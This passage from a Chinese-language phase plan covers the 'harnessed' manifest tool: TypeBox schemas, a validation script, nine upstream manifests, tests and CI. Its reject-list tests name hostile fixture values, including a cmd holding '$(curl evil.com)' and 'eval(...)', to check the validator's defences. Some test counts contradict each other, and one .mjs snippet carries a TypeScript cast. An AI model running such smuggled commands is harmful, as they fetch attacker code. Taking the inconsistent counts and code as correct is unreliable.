      invokes: Type.Array(Type.String()),
      inputs: Type.Array(Type.String()),
      outputs: Type.Union([Type.String(), Type.Array(Type.String())]),
      pause: Type.Optional(
        Type.Union([Type.Literal('human_review'), Type.Literal('optional_human_review')])
      ),
      on_veto: Type.Optional(
        Type.Union([Type.Literal('halt_workflow'), Type.Literal('rollback_to_phase_N')])
      ),
      conditional: Type.Optional(Type.Object({}, { additionalProperties: true })),
    },
    { additionalProperties: false }
  )

  export const WorkflowSchema = Type.Object(
    {
      name: Type.String(),
      namespace: Type.String({ pattern: '^/harnessed:[a-z][a-z0-9-]*$' }),
      phases: Type.Array(PhaseSchema, { minItems: 1 }),
    },
    { additionalProperties: false }
  )

  export type Workflow = Static<typeof WorkflowSchema>
  ```
- **文件 2**：扩展 `scripts/build-schema.ts` 也输出 `schemas/workflow.v1.schema.json`
- **验收**：
  - [ ] `schemas/workflow.v1.schema.json` 9 字段全覆盖（id/layer/upstream/invokes/inputs/outputs/pause/on_veto/conditional）
- **决策来源**：SPEC § 10 + ASSUMPTIONS A5

---

#### T5.3 routing yaml frontmatter JSON Schema
- [ ] **目标**：B+C 路由 SSOT schema（trigger / hard_route / soft_hint / fallback）
- **文件 1**：`/d/GitCode/harnessed/src/routing/schema.ts`
- **关键代码**：
  ```ts
  import { Type, type Static } from '@sinclair/typebox'

  const Trigger = Type.Object(
    {
      keywords: Type.Array(Type.String(), { minItems: 1 }),
      file_globs: Type.Optional(Type.Array(Type.String())),
      contexts: Type.Optional(Type.Array(Type.String())),
    },
    { additionalProperties: false }
  )

  const HardRouteOverride = Type.Object(
    {
      condition: Type.String(),
      primary: Type.String(),
      secondary: Type.Optional(Type.String()),
    },
    { additionalProperties: false }
  )

  const HardRouteBranch = Type.Object(
    {
      condition: Type.String(),
      route: Type.String(),
      members: Type.Optional(Type.Array(Type.String())),
    },
    { additionalProperties: false }
  )

  const HardRoute = Type.Object(
    {
      primary: Type.Optional(Type.String()),
      secondary: Type.Optional(Type.String()),
      default: Type.Optional(Type.String()),
      override: Type.Optional(HardRouteOverride),
      branches: Type.Optional(Type.Array(HardRouteBranch)),
    },
    { additionalProperties: false }
  )

  const SoftHint = Type.Object(
    {
      description_template: Type.String({ minLength: 1, maxLength: 500 }),
    },
    { additionalProperties: false }
  )

  const Fallback = Type.Object(
    {
      on_hook_fail: Type.Union([
        Type.Literal('degrade_to_soft_hint'),
        Type.Literal('prompt_user'),
      ]),
      on_both_fail: Type.Union([Type.Literal('prompt_user'), Type.Literal('halt')]),
    },
    { additionalProperties: false }
  )

  export const RoutingSchema = Type.Object(
    {
      trigger: Trigger,
      hard_route: HardRoute,
      soft_hint: SoftHint,
      fallback: Fallback,
    },
    { additionalProperties: false }
  )

  export type Routing = Static<typeof RoutingSchema>
  ```
- **文件 2**：扩展 `scripts/build-schema.ts` 也输出 `schemas/routing.v1.schema.json`
- **验收**：
  - [ ] `schemas/routing.v1.schema.json` 4 块（trigger/hard_route/soft_hint/fallback）严格校验
- **决策来源**：SPEC § 9 + R4.1 + ASSUMPTIONS A6

---

#### T5.4 `pnpm validate-schemas` 自校验
- [ ] **目标**：CI 跑 ajv compile --strict=true 三个 schema 文件
- **文件**：`/d/GitCode/harnessed/scripts/validate-schemas.mjs`
- **关键代码**：
  ```js
  // ESM, runs after build:schema
  import { readFileSync } from 'node:fs'
  import Ajv from 'ajv'
  import addFormats from 'ajv-formats'

  const FILES = [
    'schemas/manifest.v1.schema.json',
    'schemas/workflow.v1.schema.json',
    'schemas/routing.v1.schema.json',
  ]

  const ajv = addFormats(
    new Ajv({
      strict: true,
      strictSchema: true,
      strictTypes: true,
      allErrors: true,
      discriminator: true,
    })
  )

  let failed = 0
  for (const f of FILES) {
    try {
      const json = JSON.parse(readFileSync(f, 'utf8'))
      ajv.compile(json)
      console.log(`OK ${f}`)
    } catch (e) {
      console.error(`FAIL ${f}: ${(e as Error).message}`)
      failed++
    }
  }
  process.exit(failed ? 1 : 0)
  ```
- **package.json**：`"validate-schemas": "node ./scripts/validate-schemas.mjs"` 已在 ADR 0002 模板中
- **验收**：
  - [ ] `pnpm build:schema && pnpm validate-schemas` exit 0
- **决策来源**：GA-1 § CI 集成 + ADR 0002 § script

---

### T6. SCHEMA.md 三份（依赖 T1，可与 T3-T5 并行）

#### T6.1 `manifests/SCHEMA.md`（B7 增补 — ROADMAP 漏列）
- [ ] **目标**：实现视图说明（与 ADR 0001 决策视图互补）+ 9 上游路径占位 + 链接
- **文件**：`/d/GitCode/harnessed/manifests/SCHEMA.md`
- **内容大纲**：
  - 引用 ADR 0001 作为 SSOT（决策来源）
  - 链接 `schemas/manifest.v1.schema.json`（CI / IDE 消费）
  - 4 type × 5 method 兼容矩阵（直接复制 ADR 0001 表）
  - 9 上游 manifest 文件路径表（manifests/skill-packs/*.yaml + manifests/tools/*.yaml）
  - VS Code yaml 插件配置示例：
    ```yaml
    # 在 manifest 顶部添加
    # yaml-language-server: $schema=https://harnessed.dev/schemas/manifest.v1.schema.json
    ```
  - 添加新 manifest 的 step-by-step（ADR 0001 + scaffold 命令占位）
- **验收**：
  - [ ] 文件 ≥ 100 行
  - [ ] 含 ADR 0001 链接 + schema 文件链接 + 9 上游表格
- **决策来源**：ASSUMPTIONS B7

---

#### T6.2 `workflows/SCHEMA.md`（phases schema 标准定义）
- [ ] **目标**：复刻 SPEC § 10 标准定义 + plan-feature reference 完整示例
- **文件**：`/d/GitCode/harnessed/workflows/SCHEMA.md`
- **内容大纲**：
  - 9 字段表（id / layer / upstream / invokes / inputs / outputs / pause? / on_veto? / conditional?）— 直接复制 SPEC § 10 字段定义表
  - plan-feature 完整 frontmatter 示例（直接从 SPEC § 10 / WORKFLOWS § Workflow 3 复制）
  - 三层栈语义（governance / orchestration / execution）
  - 链接 `schemas/workflow.v1.schema.json`
  - VS Code yaml 插件配置
- **验收**：
  - [ ] 文件 ≥ 80 行
  - [ ] 含 plan-feature reference 完整示例
- **决策来源**：SPEC § 10

---

#### T6.3 `routing/SCHEMA.md`（B+C 路由 yaml frontmatter）
- [ ] **目标**：完整解释 trigger / hard_route / soft_hint / fallback 4 块
- **文件**：`/d/GitCode/harnessed/routing/SCHEMA.md`
- **内容大纲**：
  - 4 块字段表 + 类型 + 必填性
  - routing/ui.md 完整示例（直接从 SPEC § 9 复制）
  - B 层（description）与 C 层（hook）共享同一 frontmatter 的实现说明
  - 链接 `schemas/routing.v1.schema.json`
- **验收**：
  - [ ] 文件 ≥ 80 行
  - [ ] 含 routing/ui.md style 完整示例
- **决策来源**：SPEC § 9 + R4.1

---

### T7. 9 上游 manifest dry-run（C2 mitigation — 依赖 T4 完成 validator）

> ⚠️ **执行约束**：T7.1-T7.9 任一发现 schema 缺字段 → STOP T8，先 jump 到 T7.10 反哺 ADR；不允许 work around。
> ⚠️ **dry-run 性质**：本 phase 仅验证 schema 字段充分性，9 个 manifest 在 phase 1.2 装 installer 时再精化字段值。

#### T7.1 起草 `manifests/skill-packs/gstack.yaml`（git-clone-with-setup, cc-skill-pack, command）
- [ ] 文件：`manifests/skill-packs/gstack.yaml`
- 关键字段（dry-run，可填占位 placeholder）：
  ```yaml
  apiVersion: harnessed/v1
  kind: Manifest
  metadata:
    name: gstack
    display_name: gstack
    description: Virtual startup team for governance gates (CEO / Eng / Designer review)
    upstream:
      source: gstack
      homepage: https://github.com/garrytan/gstack
      repository: https://github.com/garrytan/gstack.git
      license: MIT
      notice: gstack v0.1 by garrytan, used as governance layer per harnessed CLAUDE.md
  spec:
    type: cc-skill-pack
    component_type: command
    install:
      method: git-clone-with-setup
      cmd: "git clone https://github.com/garrytan/gstack.git ~/.claude/skills/gstack && cd ~/.claude/skills/gstack && ./setup.sh"
      git_ref: TBD-COMMIT-HASH
      idempotent_check: "test -d ~/.claude/skills/gstack/.git"
    verify:
      cmd: "claude /office-hours --version || true"
      timeout_ms: 5000
    uninstall:
      cmd: "rm -rf ~/.claude/skills/gstack"
      cleanup_paths:
        - ~/.claude/skills/gstack
    upstream_health:
      stability: stable
      last_check: "2026-05-11"
      last_known_good_version: TBD
      fallback_action: warn
    signed_by: harnessed-maintainer
    platforms: [linux, darwin, win32]
  ```
- **验收**：
  - [ ] `pnpm exec node -e 'import("./dist/index.mjs").then(m=>console.log(m.validateManifestFile(require("fs").readFileSync("manifests/skill-packs/gstack.yaml","utf8"),"manifests/skill-packs/gstack.yaml")))'` 返回 `{ ok: true, ... }`
  - [ ] **如 ok=false**：log 缺失字段到 progress.md § B，jump 到 T7.10
- **决策来源**：SPEC § 2 上游 1 + ADR 0001 git-clone-with-setup 矩阵

---

#### T7.2 起草 `manifests/skill-packs/GSD.yaml`（npm-cli, cli-npm, command）
- [ ] 文件：`manifests/skill-packs/GSD.yaml`
- 关键差异：`type: cli-npm`、`install.method: npm-cli`、`npm_version: ^minor`
- **验收**：validator pass；npm_version 字段格式正确
- **决策来源**：SPEC § 2 上游 2

---

#### T7.3 起草 `manifests/tools/superpowers.yaml`（cc-plugin-marketplace, cc-plugin, command）
- [ ] 文件：`manifests/tools/superpowers.yaml`
- 关键差异：`type: cc-plugin`、`install.method: cc-plugin-marketplace`
- **验收**：validator pass
- **决策来源**：SPEC § 2 上游 3

---

#### T7.4 起草 `manifests/skill-packs/planning-with-files.yaml`（cc-plugin-marketplace, cc-skill-pack, command）
- [ ] 文件：`manifests/skill-packs/planning-with-files.yaml`
- **验收**：validator pass
- **决策来源**：SPEC § 2 上游 4

---

#### T7.5 起草 `manifests/skill-packs/mattpocock-skills.yaml`（npx-skill-installer, cc-skill-pack, command）
- [ ] 文件：`manifests/skill-packs/mattpocock-skills.yaml`
- **验收**：validator pass
- **决策来源**：SPEC § 2 上游 5

---

#### T7.6 起草 `manifests/skill-packs/karpathy-skills.yaml`（npx-skill-installer, cc-skill-pack, **behavior-rule**）
- [ ] 文件：`manifests/skill-packs/karpathy-skills.yaml`
- 关键差异：`component_type: behavior-rule`（与 command 语义不同 — CLAUDE.md 注入而非命令注册）
- **验收**：
  - [ ] validator pass
  - [ ] 验证 component_type 为 behavior-rule 时 schema 不强制要求 `invokes` 字段（虽 spec 中也允许其他 component_type 不写 invokes — invokes 是 workflow phase 字段而非 manifest 字段，本 dry-run 可观察）
  - [ ] 如发现 ADR 0001 对 behavior-rule 字段缺约束（如 `claude_md_block_marker`） → log finding 到 progress.md § B
- **决策来源**：SPEC § 2 上游 6 + ADR 0001 component_type semantics

---

#### T7.7 起草 `manifests/tools/ralph-loop.yaml`（cc-plugin-marketplace, cc-plugin, command）
- [ ] 文件：`manifests/tools/ralph-loop.yaml`
- **验收**：validator pass
- **决策来源**：SPEC § 2 上游 7

---

#### T7.8 起草 `manifests/tools/tavily-mcp.yaml`（mcp-stdio-add, mcp-npm, mcp-tool）
- [ ] 文件：`manifests/tools/tavily-mcp.yaml`
- 关键差异：`type: mcp-npm`、`component_type: mcp-tool`、`install.method: mcp-stdio-add`、`npm_version: ^minor`
- **验收**：
  - [ ] validator pass
  - [ ] install.cmd 含 `claude mcp add --scope project tavily-mcp ...`（R3.2 强制 --scope project）— **本 phase 不实际执行该命令，仅 manifest 文本表达**
- **决策来源**：SPEC § 2 上游 8 + R3.2

---

#### T7.9 起草 `manifests/tools/exa-mcp.yaml` + `manifests/tools/ctx7.yaml`（合并任务）
- [ ] **文件 1**：`manifests/tools/exa-mcp.yaml`（mcp-stdio-add, mcp-npm, mcp-tool）
- [ ] **文件 2**：`manifests/tools/ctx7.yaml`（npm-cli, cli-npm, cli-binary）— **acceptance bar A2 要求 ctx7 manifest 在正向测试中 pass**
- 关键差异 ctx7：`type: cli-npm`、`component_type: cli-binary`
- **验收**：
  - [ ] 两份 yaml validator pass
  - [ ] 9 上游全覆盖（5 method × 4 type × 4 component_type 矩阵全部触达至少 1 次）
- **决策来源**：SPEC § 2 上游 9-10 + acceptance bar A2

---

#### T7.10 反哺 ADR 0001（条件性）
- [ ] **触发条件**：T7.1-T7.9 中任一 manifest validator 报 schema 缺字段错（不算 placeholder 占位 TBD-COMMIT-HASH 这种字段值类错误）
- **如触发**：
  - 路径 A：缺字段是 add-only（不破坏现有 v1）→ in-place patch ADR 0001 + bump 文件 last-updated date + 记入 progress.md § B
  - 路径 B：缺字段需改语义（破坏 v1 冻结）→ 出 `docs/adr/0003-manifest-schema-v1-errata.md` 解释 errata 范围 + 升级路径 + Status: "Accepted"
- **如未触发**：log 一条 progress.md § B "9 上游 dry-run 全 pass，schema v1 字段充分性验证通过" 即可
- **验收**：
  - [ ] progress.md § B 包含本 task 的 final verdict（充分 / 需 patch / 需 errata 三选一）
  - [ ] 如出 ADR 0003，docs/adr/README.md 索引同步更新
- **决策来源**：ASSUMPTIONS C2 callout + SPEC § 8.1 schema 冻结纪律

---

### T8. 测试（依赖 T4 + T6 + T7）

#### T8.1 正向测试：9 上游 manifest 全 pass
- [ ] 文件：
  - fixture：`tests/fixtures/manifests/valid/{gstack,GSD,superpowers,planning-with-files,mattpocock-skills,karpathy-skills,ralph-loop,tavily-mcp,exa-mcp,ctx7}.yaml`（直接从 manifests/ 软链或复制）
  - test：`tests/unit/manifest-validate.positive.test.ts`
- 测试模板：
  ```ts
  import { describe, it, expect } from 'vitest'
  import { readFileSync, readdirSync } from 'node:fs'
  import { resolve } from 'node:path'
  import { validateManifestFile } from '../../src/manifest/validate.js'

  const FIXTURE_DIR = resolve('tests/fixtures/manifests/valid')

  describe('valid manifests pass validation', () => {
    for (const file of readdirSync(FIXTURE_DIR)) {
      it(`${file} validates`, () => {
        const yaml = readFileSync(resolve(FIXTURE_DIR, file), 'utf8')
        const result = validateManifestFile(yaml, file)
        if (!result.ok) console.error(result.errors)
        expect(result.ok).toBe(true)
      })
    }
  })
  ```
- **验收**：9 个测试全绿（acceptance bar A2 包含 ctx7）
- **决策来源**：C6 callout + B6

---

#### T8.2 必填字段缺失测试（17 个）
- [ ] 文件：
  - fixtures：`tests/fixtures/manifests/invalid/missing-{apiVersion,kind,metadata.name,metadata.description,metadata.upstream.source,metadata.upstream.homepage,metadata.upstream.repository,metadata.upstream.license,metadata.upstream.notice,spec.type,spec.component_type,spec.install,spec.verify,spec.uninstall,spec.upstream_health,spec.signed_by,spec.platforms}.yaml`
  - test：`tests/unit/manifest-validate.required.test.ts`
- 模板：每个 fixture omit 一个必填字段，测试 expect `ok: false` + `errors.some(e => e.path.includes('<field>'))`
- **验收**：17 个测试全绿
- **决策来源**：B6 + ADR 0001 必填字段总览

---

#### T8.3 type × method 矩阵非法组合测试（18 illegal — 6 method × 4 type = 24 - 6 legal = 18）
- [ ] 文件：
  - fixtures：`tests/fixtures/manifests/invalid/invalid-method-{cc-plugin-with-git-clone,cc-plugin-with-npm-cli,cc-skill-pack-with-mcp-stdio,cc-skill-pack-with-npm-cli,mcp-npm-with-cc-plugin-marketplace,mcp-npm-with-git-clone,mcp-npm-with-npm-cli,cli-npm-with-cc-plugin-marketplace,cli-npm-with-mcp-stdio,cli-npm-with-mcp-http,...}.yaml`
  - test：`tests/unit/manifest-validate.matrix.test.ts`
- ADR 0001 矩阵 — 6 合法组合：
  - cc-plugin × cc-plugin-marketplace
  - cc-skill-pack × {cc-plugin-marketplace, git-clone-with-setup, npx-skill-installer}
  - mcp-npm × {mcp-stdio-add, mcp-http-add}
  - cli-npm × npm-cli
- 4 type × 5 method = 20 组合 - 6 合法 - 4 type 与 mcp-http 仅 mcp-npm 合法（实际 method 7 个）= **重新计算**：
  - 4 type × 6 method（cc-plugin-marketplace / git-clone-with-setup / npx-skill-installer / npm-cli / mcp-stdio-add / mcp-http-add）= 24 组合 - 7 合法 = 17 illegal
  - 选 14 个高频代表覆盖 ≥ 80% 矩阵风险（剩余 3 个由 T8.7 covered）
- **验收**：14 个测试全绿；error message 含 "type=X 不允许 method=Y" 类似语义
- **决策来源**：ADR 0001 type × method 矩阵 + B6

---

#### T8.4 reject list 测试（4 项）
- [ ] 文件：
  - fixtures：
    - `tests/fixtures/manifests/invalid/reject-shell-escape-cmd.yaml`（cmd 含 `$(curl evil.com)`）
    - `tests/fixtures/manifests/invalid/reject-shell-var-cmd.yaml`（cmd 含 `${EVIL}`）
    - `tests/fixtures/manifests/invalid/reject-eval.yaml`（任意值含 `eval(...)`）
    - `tests/fixtures/manifests/invalid/reject-yaml-tag.yaml`（含 `!ruby/regexp`）
    - `tests/fixtures/manifests/invalid/reject-extends.yaml`（顶层含 `extends: foo`）
    - `tests/fixtures/manifests/invalid/reject-unknown-field.yaml`（顶层含 `weird_custom_field: bar`）
  - test：`tests/unit/manifest-validate.reject.test.ts`
- **验收**：6 个测试全绿（覆盖 4 项 reject list + extends + unknown field）
- **决策来源**：ADR 0001 reject list + R9.3

---

#### T8.5 SPDX license + 行号定位测试
- [ ] 文件：
  - fixtures：
    - `tests/fixtures/manifests/invalid/spdx-gpl.yaml`（license: GPL-3.0）
    - `tests/fixtures/manifests/invalid/spdx-proprietary.yaml`
    - `tests/fixtures/manifests/invalid/line-num-1.yaml`...`line-num-5.yaml`（每份在已知行号写错字段）
  - test：`tests/unit/manifest-validate.spdx.test.ts` + `tests/unit/manifest-validate.line-number.test.ts`
- 行号 assertion 模板：
  ```ts
  it('line-num-3.yaml: invalid type at line 11', () => {
    const yaml = readFileSync(...).toString()
    const result = validateManifestFile(yaml, 'line-num-3.yaml')
    expect(result.ok).toBe(false)
    if (!result.ok) {
      expect(result.errors.some(e => e.line === 11)).toBe(true)
    }
  })
  ```
- **验收**：≥ 5 个行号测试全绿（行号偏差 = 0）
- **决策来源**：GA-1 § yaml CST + B6

---

#### T8.6 Benchmark：100 manifest < 50ms
- [ ] 文件：`tests/integration/manifest-validate.bench.ts`
- 模板：
  ```ts
  import { bench } from 'vitest'
  import { readFileSync } from 'node:fs'
  import { validateManifestFile } from '../../src/manifest/validate.js'

  const yaml = readFileSync('tests/fixtures/manifests/valid/ctx7.yaml', 'utf8')

  bench('validate 100 manifests', () => {
    for (let i = 0; i < 100; i++) {
      validateManifestFile(yaml, `bench-${i}.yaml`)
    }
  }, { time: 1000 })
  ```
- **验收**：mean < 50ms（GA-1 SLA 100ms 留 50% 裕度）
- **决策来源**：GA-1 § 验收建议 6

---

#### T8.7 workflow + routing schema 同等覆盖
- [ ] 文件：
  - fixtures：
    - `tests/fixtures/workflows/valid/research.yaml`（最小可 pass 的 phases yaml）
    - `tests/fixtures/workflows/valid/plan-feature.yaml`（reference 完整 5 phase 示例）
    - `tests/fixtures/workflows/invalid/missing-id.yaml` / `invalid-layer.yaml` / `bad-namespace.yaml` / `phases-empty.yaml` / `unknown-field.yaml`
    - `tests/fixtures/routing/valid/ui.yaml` / `search.yaml`
    - `tests/fixtures/routing/invalid/no-trigger.yaml` / `bad-fallback.yaml` / `extra-field.yaml`
  - test：`tests/unit/workflow-validate.test.ts` + `tests/unit/routing-validate.test.ts`（两个都用对应 schema validator — 实现可在 T4.1 同模式扩展）
- **验收**：每个 schema ≥ 5 正向 + 5 负向 = ≥ 20 个新增测试
- **决策来源**：A5 + A6 + B6

---

#### T8.8 总测试数 ≥ 50 + 覆盖率 ≥ 80%
- [ ] 验收命令：
  ```bash
  pnpm test:coverage
  ```
- **预期总数**（粗算）：
  - T8.1: 9
  - T8.2: 17
  - T8.3: 18
  - T8.4: 6
  - T8.5: 5 + 行号 5 = 10
  - T8.6: 1 (bench)
  - T8.7: 20+
  - **合计**：≥ 77 测试
- **验收**：
  - [ ] `Tests: ≥ 50 passed`
  - [ ] coverage statements ≥ 80%
  - [ ] coverage branches ≥ 75%（discriminator union 分支覆盖）
- **决策来源**：C6 callout 具体化 + acceptance bar A1

---

### T9. CI + Docs 收尾（依赖 T1-T8 大部分）

#### T9.1 GitHub Actions 三平台 CI
- [ ] 文件：`/d/GitCode/harnessed/.github/workflows/ci.yml`
- **内容**：直接复制 GRAY-AREA-2 § CI 矩阵骨架（已 ready-to-use）
- **验收**：
  - [ ] PR 触发 3 个 job：ubuntu / macos / windows × Node 22
  - [ ] `fail-fast: false` 配置正确
  - [ ] `node ./dist/cli.mjs --version` 步骤跨 OS 都 pass
- **决策来源**：ADR 0002 § CI 矩阵 + R5.1

---

#### T9.2 `.github/workflows/schema-validate.yml`（B5）
- [ ] 文件：`/d/GitCode/harnessed/.github/workflows/schema-validate.yml`
- **内容**：单 ubuntu-latest job 跑 `pnpm validate-schemas` + `pnpm exec ajv compile -s schemas/manifest.v1.schema.json --strict=true`
- **验收**：PR 触发；schema 偏差立即 fail
- **决策来源**：ASSUMPTIONS B5

---

#### T9.3 更新 `README.md`
- [ ] 文件：`/d/GitCode/harnessed/README.md`
- **内容大纲**：
  - 项目定位 1-2 段（取自 SPEC § 1 + § 6）
  - "Not affiliated with Harness Inc." disclaimer（顶部显眼位置）
  - 当前状态：v0.1.0-alpha.1（phase 1.1 schema frozen）
  - 安装节占位（v0.1 ship 时填充）
  - 目录索引：链接 ADR 0001 / 0002 / SPEC / WORKFLOWS / ROADMAP
  - 设计哲学（5 条，取自 SPEC § 3）
- **验收**：
  - [ ] README 含 disclaimer
  - [ ] 含 ADR 索引链接
- **决策来源**：SPEC § 7 风险表 + R8.4 占位

---

#### T9.4 写 `CONTRIBUTING.md`
- [ ] 文件：`/d/GitCode/harnessed/CONTRIBUTING.md`
- **内容大纲**：
  - dev setup：`corepack enable` + `pnpm install` + `pnpm typecheck && lint && test`
  - 命令清单：`pnpm dev` / `pnpm test:watch` / `pnpm build:schema` / etc.
  - 开发流程：分支策略 / 提交格式 (`phase-X.Y: T<N>.<M> <action>`) / PR 模板占位
  - 为什么 schema 改动需要 ADR
  - karpathy simplicity / surgical changes 提示
- **验收**：
  - [ ] 30 分钟新人可跑通 dev 环境（人工验证或后续 phase 4.2 验收）
- **决策来源**：R8.2 占位（v0.4 真验收）+ ADR 0002

---

#### T9.5 写 `docs/MAINTAINER-ONBOARDING.md` 占位
- [ ] 文件：`/d/GitCode/harnessed/docs/MAINTAINER-ONBOARDING.md`
- **内容**：标 "Stub — populated in v0.4 per R8.2"，列大纲（待填）
- **验收**：占位文件存在
- **决策来源**：R8.2

---

#### T9.6 `docs/adr/README.md` ADR 索引
- [ ] 文件：`/d/GitCode/harnessed/docs/adr/README.md`
- **内容**：
  - 0001-manifest-schema-v1.md — Accepted 2026-05-11
  - 0002-repo-structure-toolchain-v0.1.md — Accepted 2026-05-11
  - 0003-* — 条件性（仅当 T7.10 触发反哺时）
- **验收**：所有 ADR 全部列出
- **决策来源**：R8.4 占位

---

### T10. Phase 1.1 verify（最后一关 — 依赖全部）

#### T10.1 三平台跑全套
- [ ] 命令：
  ```bash
  pnpm typecheck && pnpm lint && pnpm test:coverage && pnpm build && pnpm validate-schemas
  ```
- **验收**：
  - [ ] 三平台 GitHub Actions 全绿（实际 PR / push 触发）
  - [ ] 本地 Windows native 预先跑一遍 0 失败
- **决策来源**：R5.1 + ADR 0002 § CI 守护 + acceptance bar A4

---

#### T10.2 写 `.planning/phase-1.1/VERIFICATION.md`
- [ ] 文件：`/d/GitCode/harnessed/.planning/phase-1.1/VERIFICATION.md`
- **内容**：
  - acceptance bar A1-A8 的复现命令清单（每个 bar 一行 bash）
  - 如何 retest（对照 PLAN.md § 4.1）
  - 已知偏差 / 已 log 的 finding 引用
- **验收**：文件 ≥ 50 行；任何人可按文件复现验收
- **决策来源**：GSD 标准

---

#### T10.3 更新 `.planning/STATE.md`
- [ ] 文件：`/d/GitCode/harnessed/.planning/STATE.md`
- **内容增补**：
  ```markdown
  ## Phase 1.1 — DONE (2026-MM-DD)

  - Status: completed
  - Acceptance bar A1-A8: all green
  - Unblocks: phase 1.2 (cross-OS CI + 2 installer), 1.3, 1.4
  - Key findings: see .planning/phase-1.1/progress.md § B
  - ADR delta: 0001/0002 unchanged; [optional 0003 errata if T7.10 triggered]
  - Tag: v0.1.0-alpha.1-schema-frozen
  ```
- **验收**：STATE.md phase 1.1 section 完整
- **决策来源**：GSD 标准

---

#### T10.4 git tag `v0.1.0-alpha.1-schema-frozen`
- [ ] 命令：
  ```bash
  cd /d/GitCode/harnessed
  git tag -a v0.1.0-alpha.1-schema-frozen -m "Phase 1.1 done: manifest schema v1 frozen per ADR 0001 + repo skeleton per ADR 0002"
  git push origin v0.1.0-alpha.1-schema-frozen
  ```
- **验收**：
  - [ ] `git tag --list | grep schema-frozen` 输出该 tag
  - [ ] 远端 GitHub 显示该 tag
- **决策来源**：SPEC § 8.1 schema 冻结纪律

---

## 完成 phase 1.1 的最后一行 commit message 模板

```
phase-1.1: T10.4 freeze manifest schema v1 — close phase 1.1

- All 10 task groups (T1-T10) complete; acceptance bars A1-A8 all green.
- ADR 0001 / 0002 frozen as repo SSOT; future schema changes require new ADR per SPEC sec 8.1.
- Unblocks phase 1.2 (cross-OS CI + cli-npm + mcp-stdio installer).
- Tag: v0.1.0-alpha.1-schema-frozen
```

---

## 维护检查清单（每次 commit 前自检）

- [ ] 改动的 task 在本文件已勾选
- [ ] progress.md 已追加一行
- [ ] 任何意外 / 决策修订已写入 progress.md § B（如发生）
- [ ] commit message 含 task ID + 简短 action + 决策来源（ADR / GA / SPEC § 章节）
- [ ] 该 task 涉及代码改动 → `pnpm typecheck && pnpm lint && pnpm test` 局部都通过
